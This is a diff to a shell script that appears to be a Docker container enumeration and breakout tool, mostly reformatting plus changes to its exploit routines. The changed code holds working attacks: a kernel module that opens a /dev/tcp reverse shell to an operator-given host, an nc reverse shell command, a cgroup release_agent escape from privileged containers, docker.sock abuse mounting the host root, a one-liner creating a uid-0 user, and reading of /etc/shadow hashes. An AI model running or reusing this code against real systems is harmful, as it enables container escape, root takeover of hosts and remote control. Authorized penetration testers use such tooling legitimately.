@@ -65,9 +65,7 @@ Usage: ${0##*/} [OPTIONS...]
     DOCKER               use docker command to create new contains and mount root partition to priv esc
     PRIVILEGED           exploit a container with privileged mode to run commands on the host
     SOCK                 use an exposed docker sock to create a new container and mount root partition to priv esc
-    CVE-2019-5746
-    CVE-2019-5021
-    SYS_MODULE           Exploit the SYS_MODULE privilege to create a malicious kernel module and obtain root on the host
+    SYS_MODULE           exploit the SYS_MODULE privilege to create a malicious kernel module and obtain root on the host
 
   ${DG}[Payloads & Options]$NC
   -i, --ip               The local host IP address for reverse shells to connect to
@@ -129,10 +127,10 @@ TIP_CVE_2019_5736="Docker versions before 18.09.2 are vulnerable to a container 
 TIP_SYS_MODULE="Giving the container the SYS_MODULE privilege allows for kernel modules to be mounted. Using this, a malicious module can be used to execute code as root on the host."
 
 DANGEROUS_GROUPS="docker\|lxd\|root\|sudo\|wheel"
-DANGEROUS_CAPABILITIES="cap_sys_admin\|cap_sys_ptrace\|cap_sys_module\|dac_read_search\|dac_override"
+DANGEROUS_CAPABILITIES="cap_sys_admin\|cap_sys_ptrace\|cap_sys_module\|cap_dac_read_search\|cap_dac_override"
 
 CONTAINER_CMDS="docker lxc rkt kubectl podman"
-USEFUL_CMDS="curl wget gcc nc netcat ncat jq nslookup host hostname dig python python2 python3 nmap"
+USEFUL_CMDS="curl wget gcc nc netcat ncat jq nslookup host hostname dig python python2 python3 nmap msfconsole"
 
 ###########################################
 #---------------) Helpers (---------------#
@@ -169,9 +167,9 @@ printSection() {
     s="$1"
   fi
   size=${#s}
-  no=$((l-size))
-  start=$((no/2))
-  end=$((no-start))
+  no=$((l - size))
+  start=$((no / 2))
+  end=$((no - start))
   printf "%s%${start}s" "$B" | tr " " "="
   printf "%s%s%s" "$GREEN" "$s" "$B"
   printf "%${end}s" | tr " " "="
@@ -273,14 +271,14 @@ installPackages() {
 
     export DEBIAN_FRONTEND=noninteractive
     if ! [ "$(apt update 2>/dev/null)" ]; then #
-        printError "Failed"
-        return
+      printError "Failed"
+      return
     fi
 
     if apt install --no-install-recommends --force-yes -y dnsutils curl nmap iputils-ping libcap2-bin >/dev/null 2>&1; then
-        printSuccess "Success"
+      printSuccess "Success"
     else
-        printError "Failed"
+      printError "Failed"
     fi
 
   elif [ -x "$(command -v apk)" ]; then
@@ -295,7 +293,7 @@ installPackages() {
   fi
 }
 
-unsetColors(){
+unsetColors() {
   RED=""
   GREEN=""
   Y=""
@@ -307,16 +305,18 @@ unsetColors(){
   EX=""
 }
 
-describeColors(){
+describeColors() {
   # Describe the colors unless they have been unset or we're being quiet
   if [ "$quiet" ] || ! [ "$RED" ]; then
     return
   fi
   printSection "Colors"
-  printQuestion "Exploit Test ............"; printEx "Exploitable - Check this out";
+  printQuestion "Exploit Test ............"
+  printEx "Exploitable - Check this out"
   printResult "Basic Test .............." "Positive Result"
   printResult "Another Test ............" "" "Error running check"
-  printQuestion "Negative Test ..........."; printNo;
+  printQuestion "Negative Test ..........."
+  printNo
   printResultLong "Multi line test ........." "Command output
 spanning multiple lines"
   nl
@@ -375,7 +375,7 @@ userCheck() {
   fi
 
   printQuestion "Groups .................."
-  groups=$(groups| sed "s/\($DANGEROUS_GROUPS\)/${LG}${EX}&${NC}${DG}/g")
+  groups=$(groups | sed "s/\($DANGEROUS_GROUPS\)/${LG}${EX}&${NC}${DG}/g")
   printStatus "$groups" "None"
 }
 
@@ -484,11 +484,11 @@ containerIPs() {
   printResult "Host IP ................." "$hostIP" "Could not find Host IP"
 }
 
-containerTools(){
+containerTools() {
   for CMD in ${CONTAINER_CMDS}; do
     tools="$tools $(command -v "${CMD}")"
   done
-  printResultLong "Container tools ........." "$(echo "$tools" | tr ' ' '\n'| grep -v '^$')" "None"
+  printResultLong "Container tools ........." "$(echo "$tools" | tr ' ' '\n' | grep -v '^$')" "None"
 }
 
 containerName() {
@@ -498,15 +498,15 @@ containerName() {
   if [ "$containerType" = "docker" ]; then
     # Requires containerIP
     if [ "$containerIP" ]; then
-        if [ -x "$(command -v host)" ]; then
+      if [ -x "$(command -v host)" ]; then
         containerName=$(host "$containerIP" | rev | cut -d' ' -f1 | rev)
-        elif [ -x "$(command -v dig)" ]; then
+      elif [ -x "$(command -v dig)" ]; then
         containerName=$(dig -x "$containerIP" +noall +answer | grep 'PTR' | rev | cut -f1 | rev)
-        elif [ -x "$(command -v nslookup)" ]; then
+      elif [ -x "$(command -v nslookup)" ]; then
         containerName=$(nslookup "$containerIP" 2>/dev/null | grep 'name = ' | rev | cut -d' ' -f1 | rev)
-        else
+      else
         missingTools="1"
-        fi
+      fi
     fi
   else
     containerName=$containerID
@@ -535,7 +535,7 @@ getContainerInformation() {
 
   kernelVersion=$(uname -r)
   arch=$(uname -m)
-  cpuModel=$(grep 'model name' /proc/cpuinfo | head -n1 | cut -d':' -f2| cut -d' ' -f2-)
+  cpuModel=$(grep 'model name' /proc/cpuinfo | head -n1 | cut -d':' -f2 | cut -d' ' -f2-)
 
   printMsg "Operating System ........" "$os"
   printMsg "Kernel .................." "$kernelVersion"
@@ -553,12 +553,12 @@ getContainerInformation() {
 containerCapabilities() {
   printQuestion "Dangerous Capabilities .."
   if [ -x "$(command -v capsh)" ]; then
-    if capsh --print| grep -q "$DANGEROUS_CAPABILITIES"; then
-        caps=$(capsh --print |grep 'cap_' | sed "s/\($DANGEROUS_CAPABILITIES\)/${LG}${EX}&${NC}${DG}/g")
-        printYes
-        printStatus "$caps"
+    if capsh --print | grep -q "$DANGEROUS_CAPABILITIES"; then
+      caps=$(capsh --print | grep 'cap_' | sed "s/\($DANGEROUS_CAPABILITIES\)/${LG}${EX}&${NC}${DG}/g")
+      printYes
+      printStatus "$caps"
     else
-        printNo
+      printNo
     fi
   else
     printError "Unknown (capsh not installed)"
@@ -630,15 +630,15 @@ enumerateContainers() {
 
     # Find containers...
     if [ "$dockerCommand" ]; then
-        # Enumerate containers using docker
-        dockercontainers=$(docker ps --format "{{.Names}}" 2>/dev/null | wc -l)
-        printMsg "Docker Containers........" "$dockercontainers"
-        docker ps -a
+      # Enumerate containers using docker
+      dockercontainers=$(docker ps --format "{{.Names}}" 2>/dev/null | wc -l)
+      printMsg "Docker Containers........" "$dockercontainers"
+      docker ps -a
     elif [ "$dockerSockPath" ]; then
-        # Enumerate containers using sock
-        TODO "Enumerate container using sock"
+      # Enumerate containers using sock
+      TODO "Enumerate container using sock"
     else
-        pingSweep
+      pingSweep
     fi
 
     portScan
@@ -646,21 +646,21 @@ enumerateContainers() {
   else # Not in a container
 
     if docker ps >/dev/null 2>&1; then # Enumerate docker containers
-        dockercontainers=$(docker ps --format "{{.Names}}" 2>/dev/null | wc -l)
-        dockercontainersTotal=$(docker ps -a --format "{{.Names}}" 2>/dev/null | wc -l)
-        printMsg "Docker Containers........" "$dockercontainers Running, $dockercontainersTotal Total"
-        docker ps -a
+      dockercontainers=$(docker ps --format "{{.Names}}" 2>/dev/null | wc -l)
+      dockercontainersTotal=$(docker ps -a --format "{{.Names}}" 2>/dev/null | wc -l)
+      printMsg "Docker Containers........" "$dockercontainers Running, $dockercontainersTotal Total"
+      docker ps -a
     fi
     if lxc list >/dev/null 2>&1; then # Enumerate lxc containers
-        lxccontainers=$(lxc list | grep -c "| RUNNING |" 2>/dev/null)
-        lxccontainersTotal=$(lxc list | grep -c "| CONTAINER |" 2>/dev/null)
-        printMsg "LXC Containers..........." "$lxccontainers Running, $lxccontainersTotal Total"
-        lxc list
+      lxccontainers=$(lxc list | grep -c "| RUNNING |" 2>/dev/null)
+      lxccontainersTotal=$(lxc list | grep -c "| CONTAINER |" 2>/dev/null)
+      printMsg "LXC Containers..........." "$lxccontainers Running, $lxccontainersTotal Total"
+      lxc list
     fi
     if rkt list >/dev/null 2>&1; then # Enumerate rkt containers
-        rktcontainers=$(rkt list 2>/dev/null | tail -n +2  | wc -l)
-        printMsg "RKT Containers..........." "$rktcontainers Total" # TODO: Test and add total
-        rkt list
+      rktcontainers=$(rkt list 2>/dev/null | tail -n +2 | wc -l)
+      printMsg "RKT Containers..........." "$rktcontainers Total" # TODO: Test and add total
+      rkt list
     fi
   fi
 }
@@ -688,7 +688,8 @@ pingSweep() {
       # Ping all IPs in range
       set +m
       for addr in $(seq 1 1 10); do
-        (ping -c 1 -t 1 "$subnet.$addr" >/dev/null && echo "$subnet.$addr" is Up) & true >/dev/null
+        (ping -c 1 -t 1 "$subnet.$addr" >/dev/null && echo "$subnet.$addr" is Up) &
+        true >/dev/null
         pids="${pids} $!"
       done
 
@@ -773,7 +774,8 @@ findInterestingFiles() {
   printStatus "$boringVars"
 
   # Any common entrypoint files etc?
-  entrypoint=$(ls -lah /*.sh /*entrypoint* /**/entrypoint* /**/*.sh /deploy* 2>/dev/null)
+  # shellcheck disable=SC2010
+  entrypoint=$(ls -lah /*.sh /*entrypoint* /**/entrypoint* /**/*.sh /deploy* 2>/dev/null | grep -v "deepce.sh")
   printResultLong "Any common entrypoint files ........." "$entrypoint"
 
   # Any files in root dir
@@ -801,7 +803,7 @@ findInterestingFiles() {
     printNo
   fi
 
-  hashes=$(cut -d':' -f2 < /etc/shadow 2>/dev/null | grep -v '^*$\|^!')
+  hashes=$(cut -d':' -f2 </etc/shadow 2>/dev/null | grep -v '^*$\|^!')
   printQuestion "Hashes in shadow file ..............."
   if [ "$hashes" ]; then
     printYes
@@ -828,7 +830,7 @@ findInterestingFiles() {
 
 checkDockerRootless() {
   printQuestion "Rootless ................"
-  if docker info 2>/dev/null|grep -q rootless; then
+  if docker info 2>/dev/null | grep -q rootless; then
     printYes
     printTip "$TIP_DOCKER_ROOTLESS"
   else
@@ -923,7 +925,7 @@ prepareExploit() {
     printMsg "Username ................." "$username"
     printMsg "Password ................." "$password"
     printMsg "Clean up ................." "Manual, remember to delete user after exploitation!"
-    # Cool little bash one-liner to make a new user, set password and give it user id of 0 (root)
+    # Cool little one-liner to make a new user, set password and give it user id of 0 (root)
     cmd="useradd $username;echo $password:$password|chpasswd $username;usermod -ou 0 $username"
 
   elif [ "$command" ]; then
@@ -942,11 +944,13 @@ prepareExploit() {
       exit 1
     fi
 
+    cmd="/bin/sh -c nc $ip $port -e /bin/sh"
+
     printMsg "Shell Type ....... " "Reverse TCP"
     printMsg "Create listener .. " "No"
     printMsg "Host ............. " "$ip"
     printMsg "Port ............. " "$port"
-    cmd="/bin/sh -c nc $ip $port -e /bin/sh"
+    printMsg "Command .......... " "$cmd"
 
     if [ "$listen" ]; then
       # Enable job control
@@ -958,7 +962,7 @@ prepareExploit() {
     fi
 
   else
-    # TODO: Disable on sock / privileged as we dont have interactive
+    # TODO: Disable on sock / privileged / sys_module as we dont have interactive
     printMsg "Exploit Type ............." "Local Shell"
     printMsg "Create shell ............." "Yes"
     printMsg "Clean up ................." "Automatic on container exit"
@@ -966,7 +970,7 @@ prepareExploit() {
   fi
 
   if ! [ "$cmd" ]; then
-    printError "Nothing to do, if trying to launch a shell add -cmd bash"
+    printError "Nothing to do, if trying to launch a shell add -cmd sh"
     exit 1
   fi
 }
@@ -998,11 +1002,11 @@ exploitDocker() {
 
 exploitPrivileged() {
 
-# This is disabled because if no-enum is set then we dont know if we're in a container..
-#  if ! [ "$inContainer" ]; then
-#    printError "Not in container"
-#    return
-#  fi
+  # This is disabled because if no-enum is set then we dont know if we're in a container..
+  #  if ! [ "$inContainer" ]; then
+  #    printError "Not in container"
+  #    return
+  #  fi
 
   printSection "Exploiting Privileged"
   printTip "$TIP_PRIVILEGED_MODE"
@@ -1020,7 +1024,7 @@ exploitPrivileged() {
   t="$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)"
   touch /o
   echo "$t/c" >"$d/release_agent"
-  printf "#!/bin/sh\n%s > %s/o" "$cmd" "$t">/c
+  printf "#!/bin/sh\n%s > %s/o" "$cmd" "$t" >/c
   chmod +x /c
   sh -c "echo 0 >$d/w/cgroup.procs"
   sleep 1
@@ -1050,15 +1054,21 @@ exploitDockerSock() {
   payload="[\"/bin/sh\",\"-c\",\"chroot /mnt sh -c \\\"$cmd\\\"\"]"
   response=$(curl -s -XPOST --unix-socket /var/run/docker.sock -d "{\"Image\":\"alpine\",\"cmd\":$payload, \"Binds\": [\"/:/mnt:rw\"]}" -H 'Content-Type: application/json' http://localhost/containers/create)
 
-  if ! [ $? ]; then
-    printError 'Something went wrong'
+  if ! [ "$response" ]; then
+    printError 'Could not create container'
     echo "$response"
     return
   fi
 
   revShellContainerID=$(echo "$response" | cut -d'"' -f4)
   printQuestion "Creating container ....."
-  printSuccess "$revShellContainerID"
+
+  if [ "$revShellContainerID" ]; then
+    printSuccess "$revShellContainerID"
+  else
+    printError 'Could not get container ID'
+    exit 1
+  fi
 
   startCmd="curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/$revShellContainerID/start"
   logsCmd="curl -s --unix-socket /var/run/docker.sock \"http://localhost/containers/$revShellContainerID/logs?stderr=1&stdout=1\" --output -"
@@ -1102,7 +1112,7 @@ exploitDockerSock() {
     printError 'Something went wrong...'
   fi
 
-  printQuestion "Exploit completed ....."
+  printQuestion "Exploit completed ......"
   if [ "$listen" ]; then
     # Create listener
     printSuccess 'Switching to listener'
@@ -1115,35 +1125,9 @@ exploitDockerSock() {
   # TODO: Tidy up command
 }
 
-exploitSysModule(){
+exploitSysModule() {
   printSection "Exploiting SYS_MODULE"
   printTip "$TIP_SYS_MODULE"
-
-  if ! [ -x "$(command -v capsh)" ]; then
-    printError "capsh is required to run this exploit."
-    exit 1
-  fi
-
-  if ! [ -x "$(command -v make)" ]; then
-    printError "make is required to run this exploit."
-    exit 1
-  fi
-
-  if ! [ -x "$(command -v insmod)" ]; then
-    printError "insmod is required to run this exploit."
-    exit 1
-  fi
-
-  if ! [ -d "/lib/modules/$(uname -r)" ]; then
-    printError "Linux headers for $(uname -r) are required to run this exploit."
-    exit 1
-  fi
-
-  caps=$(capsh --print)
-  if ! echo "$caps" | grep -qa "cap_sys_module" ; then
-    printError "We don't have the SYS_MODULE capability, which is required for this exploit"
-    exit 1
-  fi
 
   if [ -z "$ip" ]; then
     printError "Missing reverse shell IP : use --ip"
@@ -1154,23 +1138,61 @@ exploitSysModule(){
     printError "Missing reverse shell port : use --port"
     exit 1
   fi
-  
+
+  if [ "$install" ]; then
+    # If install option is provided install the following
+    # TODO: Make this os independent
+    printStatus "Installing requirements"
+    apt install -y make gcc kmod >/dev/null
+  fi
+
+  if ! [ -x "$(command -v make)" ]; then
+    printInstallAdvice "make"
+    exit 1
+  fi
+
+  if ! [ -x "$(command -v gcc)" ]; then
+    printInstallAdvice "gcc"
+    exit 1
+  fi
+
+  if ! [ -x "$(command -v insmod)" ]; then
+    printInstallAdvice "kmod"
+    exit 1
+  fi
+
+  # Skip checking if it's exploitable if --force is provided
+  if ! [ "$force" ]; then
+    if ! [ -d "/lib/modules/$(uname -r)" ]; then
+      printError "Linux headers for $(uname -r) are required to run this exploit. Try: apt install linux-headers-\$(uname -r) or use --force to bypass this check."
+      exit 1
+    fi
+
+    if ! [ -x "$(command -v capsh)" ]; then
+      printError "capsh is required to test if this exploit will work. Use --force to bypass this check."
+      exit 1
+    elif ! capsh --print | grep -qa "cap_sys_module"; then
+      printError "We don't have the SYS_MODULE capability, which is required for this exploit"
+      exit 1
+    fi
+  fi
+
   module_name=$(tr -dc A-Za-z </dev/urandom | head -c 13)
   sys_cwd=$(pwd)
 
-  mkdir /dev/shm/rev && cd /dev/shm/rev || exit 1
+  mkdir -p /dev/shm/rev && cd /dev/shm/rev || exit 1
 
-  printQuestion "Writing scripts..."
+  printQuestion "Writing files  ............"
 
   # POC modified from https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd
-cat << EOF > "$module_name.c"
+  cat <<EOF >"$module_name.c"
 #include <linux/kmod.h>
 #include <linux/module.h>
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("AttackDefense");
 MODULE_DESCRIPTION("LKM reverse shell module");
 MODULE_VERSION("1.0");
-char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/$ip/$port 0>&1", NULL};
+char* argv[] = {"/bin/sh","-c","sh -i >& /dev/tcp/$ip/$port 0>&1", NULL};
 static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
 static int __init ${module_name}_init(void) {
 return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
@@ -1181,7 +1203,7 @@ module_init(${module_name}_init);
 module_exit(${module_name}_exit);
 EOF
 
-cat << EOF > Makefile
+  cat <<EOF >Makefile
 obj-m +=${module_name}.o
 all:
 	make -C /lib/modules/$(uname -r)/build M=$(pwd) modules
@@ -1191,25 +1213,25 @@ EOF
 
   printSuccess "Done"
 
-  printQuestion "Compiling kernel module..."
+  printQuestion "Compiling kernel module ..."
 
-  if make 1>/dev/null ; then
+  if make 1>/dev/null; then
     printSuccess "Done"
   else
     printError "Failed to make. Do you have all the required libraries installed?"
     exit 1
   fi
 
-  printQuestion "Mounting kernel module..."
+  printQuestion "Mounting kernel module ...."
 
-  if insmod "$module_name.ko" 1>/dev/null ; then
+  if insmod "$module_name.ko" 1>/dev/null; then
     printSuccess "Done"
   else
-    printError "Failed to mount module"
+    printError "Failed to mount module. "
     exit 1
   fi
 
-  printQuestion "Cleaning up..."
+  printQuestion "Cleaning up ..............."
 
   rm -r /dev/shm/rev
 
@@ -1257,7 +1279,7 @@ while [ $# -gt 0 ]; do
     listen="1"
     shift
     ;;
-  --user|--username)
+  --user | --username)
     username="$2"
     shift
     shift
@@ -1267,7 +1289,7 @@ while [ $# -gt 0 ]; do
     shift
     shift
     ;;
-  --pass|--password)
+  --pass | --password)
     password="$2"
     shift
     shift
@@ -1284,6 +1306,10 @@ while [ $# -gt 0 ]; do
   -p | --port)
     port="$2"
     shift
+    shift
+    ;;
+  -f | --force)
+    force="1"
     shift
     ;;
   --install)
@@ -1366,7 +1392,6 @@ if [ "$exploit" ]; then
 fi
 
 printSection ""
-
 
 if [ "$delete" ]; then
   rm -- "$0"
